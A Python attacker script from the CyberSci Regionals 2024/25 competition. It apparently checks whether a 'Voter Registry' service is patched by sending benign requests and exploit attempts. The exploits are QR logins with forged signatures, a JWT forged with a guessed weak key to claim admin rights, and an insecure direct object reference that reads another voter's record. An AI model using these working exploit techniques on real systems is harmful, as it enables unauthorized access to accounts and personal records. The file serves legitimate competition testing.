#!/usr/bin/python3
# -*- coding: utf8 -*-
#
# CyberSci Regionals 2024/25
#
# Voter Registry Attacker by 0xd13a

import requests
import traceback
import urllib3
import random
import string
import base64
import jwt
import os
import qrcode
from Crypto.PublicKey import ECC
from Crypto.Signature import eddsa
import io
from pathlib import Path
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ADMIN_PAGE = ">Voter List</h2>"
VOTER_PAGE = "Voter Address Update"
ADD_PAGE = "Register New Voter"

bad_jwt_key = "badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad"


LIST = Path(__file__).parent / "voter-list.txt"
PRIVATE_KEY = Path(__file__).parent / "private_ed25519.pem"

REQUEST_TIMEOUT = 3

class VoterRegistryAttacker(Attacker):

    LOGIN_API = "https://{}:{}/"
    ADD_API = "https://{}:{}/add"
    RECORD_API = "https://{}:{}/voter/{}"

    voters = []
    admins = []

    def __init__(self, host, port):
        super().__init__(host, port)
        self.load_voters()

    def load_voters(self) -> None:
        with open(LIST, "r") as file:
            for line in file.readlines():
                id, name, dob, address, admin = line.strip().split("|")
                if admin == "1":
                    self.admins.append(id)
                else:
                    self.voters.append(id)

    def get_cookies_from_response(self, response: requests.Response) -> dict:
        """Given a response, return all cookies as a dict."""
        cookies = response.cookies.get_dict()
        # If there was a redirect, the cookies we need may be in a previous response
        for r in response.history:
            cookies.update(r.cookies.get_dict())  # Merge cookies
        
        return cookies

    def build_qr_image(self, id, correct_sig):
        if correct_sig:
            key = ECC.import_key(open(PRIVATE_KEY).read())
            signer = eddsa.new(key, 'rfc8032')
            signature = signer.sign(id.encode())
        else:
            signature = os.urandom(64)
        
        sig = base64.b64encode(signature).decode("utf-8")
        payload = '{{"id":"{}","sig":"{}"}}'.format(id, sig)
        #print(payload)

        qr = qrcode.QRCode(version=3, box_size=20, border=10, error_correction=qrcode.constants.ERROR_CORRECT_H)
        qr.add_data(payload)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()

        return img_byte_arr

    def login(self, id, correct_sig, page_text):
        """ Log into the user account """

        img_byte_arr = self.build_qr_image(id, correct_sig)

        r = requests.post(url=self.LOGIN_API.format(self.host, self.port), files={'qr': img_byte_arr}, timeout=REQUEST_TIMEOUT, verify=False)

        if r.status_code != 200 or page_text not in r.text or \
           "token" not in self.get_cookies_from_response(r):
            return None

        return self.get_cookies_from_response(r)["token"]


    def cookie_exploit(self, id, exploit_cookie):
        """ Log into the user account """

        img_byte_arr = self.build_qr_image(id, True)

        r = requests.post(url=self.LOGIN_API.format(self.host, self.port), files={'qr': img_byte_arr}, timeout=REQUEST_TIMEOUT, verify=False)

        if r.status_code != 200 or "token" not in self.get_cookies_from_response(r):
            return None

        token = self.get_cookies_from_response(r)["token"]

        # Try to make user the admin
        if (exploit_cookie):
            decoded_data = jwt.decode(jwt=token, key=bad_jwt_key, algorithms=["HS256"], options={"verify_signature": False})
            token = jwt.encode(payload={"id": decoded_data["id"], "admin": True}, key=bad_jwt_key, algorithm="HS256")

        r = requests.get(url=self.ADD_API.format(self.host, self.port),  cookies={"token": token}, timeout=REQUEST_TIMEOUT, verify=False)

        if r.status_code != 200 or ADD_PAGE not in r.text or "token" not in self.get_cookies_from_response(r):
            return None

        return self.get_cookies_from_response(r)["token"]

    def idor(self, id, target_id):
        """ Log into the user account """

        img_byte_arr = self.build_qr_image(id, True)

        r = requests.post(url=self.LOGIN_API.format(self.host, self.port), files={'qr': img_byte_arr}, timeout=REQUEST_TIMEOUT, verify=False)

        if r.status_code != 200 or "token" not in self.get_cookies_from_response(r):
            return None

        token = self.get_cookies_from_response(r)["token"]

        r = requests.get(url=self.RECORD_API.format(self.host, self.port, target_id),  cookies={"token": token}, timeout=REQUEST_TIMEOUT, verify=False)

        if r.status_code != 200 or VOTER_PAGE not in r.text or "token" not in self.get_cookies_from_response(r):
            return None

        return self.get_cookies_from_response(r)["token"]

    def print_result(self, msg, result):
        print(msg.format("succeded" if result else "failed"))

    def benign_login(self):
        success1 = self.login(random.choice(self.admins), True,  ADMIN_PAGE) is not None
        success2 = self.login(random.choice(self.voters), True,  VOTER_PAGE) is not None

        self.print_result("Valid admin login: {}", success1)
        self.print_result("Valid voter login: {}", success2)

        if success1 and success2:
            return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    def malicious_login(self):
        success1 = self.login(random.choice(self.admins), False, ADMIN_PAGE) is not None
        success2 = self.login(random.choice(self.voters), False, VOTER_PAGE) is not None

        self.print_result("Invalid admin login: {}", success1)
        self.print_result("Invalid voter login: {}", success2)

        if success1 or success2:
            return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    def benign_admin(self):
        admin = random.choice(self.admins)
        good_voter = random.choice(self.voters)

        success1 = self.cookie_exploit(admin, False) is not None
        success2 = self.cookie_exploit(good_voter, False) is not None

        self.print_result("Admin trying to do admin work: {}", success1)
        self.print_result("Regular voter trying to do admin work: {}", success2)

        if success1 and not success2:
            return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    def malicious_admin(self):
        bad_voter = random.choice(self.voters)

        success = self.cookie_exploit(bad_voter, True) is not None

        self.print_result("Voter using an exploit to do admin work: {}", success)

        if success:
            return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    def benign_record_access(self):

        admin = random.choice(self.admins)
        voter = random.choice(self.voters)

        success1 = self.idor(admin, voter) is not None
        success2 = self.idor(voter, voter) is not None

        self.print_result("Admin can see record: {}", success1)
        self.print_result("Voter can see record: {}", success2)

        if success1 and success2:
            return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    def malicious_record_access(self):

        voter = random.choice(self.voters)
        while True:
            other_voter = random.choice(self.voters)
            if other_voter != voter:
                break

        success = self.idor(other_voter, voter) is not None

        self.print_result("Voter can see another voter's record: {}", success)

        if success:
            return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    def benign_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.benign_login()
            elif id == 2:
                return self.benign_admin()
            elif id == 3:
                return self.benign_record_access()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))

    def malicious_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.malicious_login()
            elif id == 2:
                return self.malicious_admin()
            elif id == 3:
                return self.malicious_record_access()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))